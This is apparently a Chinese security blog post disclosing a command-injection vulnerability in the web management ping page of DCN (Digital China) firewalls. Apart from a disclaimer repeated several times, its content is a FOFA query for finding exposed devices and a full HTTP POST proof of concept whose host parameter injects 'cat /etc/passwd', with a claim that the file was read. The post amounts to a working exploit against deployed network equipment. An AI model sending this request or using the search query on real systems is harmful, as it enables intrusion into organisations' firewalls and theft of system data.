#  神州数码云科信息 DCN 防火墙后台 Ping 命令执行漏洞  
 HK安全小屋   2025-06-09 15:05  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
神州数码DCN系统是一种网络交换机系统，具有高性能和可靠性。它采用先进的技术和设计，适用于大规模数据中心和企业级网络环境。神州数码云科信息技术有限公司DCN防火墙存在命令执行漏洞。  
  
  
影响版本：  
  
神州数码云科信息技术有限公司DCN防火墙存在命令执行漏洞  
  
  
FOFA:  
```
body="北京神州数码云科信息技术有限公司" && title=="Web Management"
```  
  
  
POC：  
```
POST /function/system/tool/ping.php HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://x/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: UILanguage=2; PHPSESSID=74b3d99b1a825feb79b525caa21765ff
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
dcn_test_a_967=21&dcn_test_b_967=122&dcn_test_c_967=111&dcn_test_d=_967&doing=ping&host=1;cat /etc/passwd&proto=&count=1
```  
  
成功读取/etc/passwd文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI3A4m5ybH4z5OL3HG0bAIicl1WOlJ79qH6aWoFiacJZNfBcxLp0Oprrw5eWyK8lzBwD6dAsEEFiaBpIw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
